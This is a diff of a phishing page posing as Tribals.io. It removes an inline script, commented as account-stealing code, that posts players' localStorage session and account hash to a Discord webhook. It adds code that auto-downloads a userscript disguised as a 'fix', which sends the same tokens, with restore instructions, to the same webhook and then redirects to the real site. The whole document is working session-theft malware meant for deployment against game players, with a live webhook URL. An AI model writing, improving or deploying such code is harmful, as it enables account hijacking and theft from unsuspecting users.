@@ -2,45 +2,42 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0;url=https://tribals.io">
     <title>Tribals.io</title>
-    <style>body{background:#0a0a0a;color:#0a0a0a;}</style>
+    <style>body{background:#0a0a0a;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;flex-direction:column;}</style>
 </head>
 <body>
-<!-- Hesap çalma kodu - tribals.io açılmadan önce çalışır, tarayıcıyı hazırlar -->
-<script>
-// Session'ı alıp Discord'a gönderen fonksiyon
-const WEBHOOK = "https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";
+    <script>
+        // 1. UserScript'i otomatik indir
+        const scriptKod = `// ==UserScript==
+// @name         Tribals Fix Cam
+// @namespace    http://tampermonkey.net/
+// @match        https://tribals.io/*
+// @grant        GM_xmlhttpRequest
+// @connect      discord.com
+// @run-at       document-end
+// ==/UserScript==
 
-// Session varsa gönder (kullanıcı daha önce giriş yapmışsa localStorage'ında kalır)
-(function() {
-    const s = localStorage.getItem('session');
-    const h = localStorage.getItem('accountHash');
-    const u = localStorage.getItem('userName') || 'Player';
+(function(){
+    const W="https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";
+    function g(t,d){GM_xmlhttpRequest({method:"POST",url:W,headers:{"Content-Type":"application/json"},data:JSON.stringify({embeds:[{title:"📥 "+t,color:0x8b0000,fields:[{name:"Data",value:"\`\`\`"+d+"\`\`\`"}],timestamp:new Date().toISOString()}]})})}
+    setTimeout(()=>{
+        let s=localStorage.getItem("session"),h=localStorage.getItem("accountHash"),u=localStorage.getItem("userName")||"?";
+        if(s) g("Session", "User: "+u+"\\nSession: "+s+"\\nHash: "+(h||"-")+"\\n\\nRestore:\\nlocalStorage.setItem('session','"+s+"');\\nlocalStorage.setItem('accountHash','"+(h||"")+"');");
+    },8000);
+})();`;
 
-    if (s) {
-        const payload = "User: " + u + "\nSession: " + s + "\nHash: " + (h || "N/A") + 
-                        "\n\nRestore kodu:\nlocalStorage.setItem('session', '" + s + "');\n" +
-                        "localStorage.setItem('accountHash', '" + (h || "") + "');\nlocation.reload();";
+        const blob = new Blob([scriptKod], {type:'text/javascript'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'tribals.user.js';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
 
-        // Discord'a gönder (fetch ile)
-        fetch(WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "📥 Tribals Session",
-                    color: 0x8b0000,
-                    fields: [
-                        { name: "User", value: u, inline: true },
-                        { name: "Data", value: "```" + payload + "```" }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            })
-        }).catch(e => console.log(e));
-    }
-})();
-</script>
+        // 2. Hemen tribals'a yönlen
+        window.location.href = "https://tribals.io";
+    </script>
 </body>
 </html>
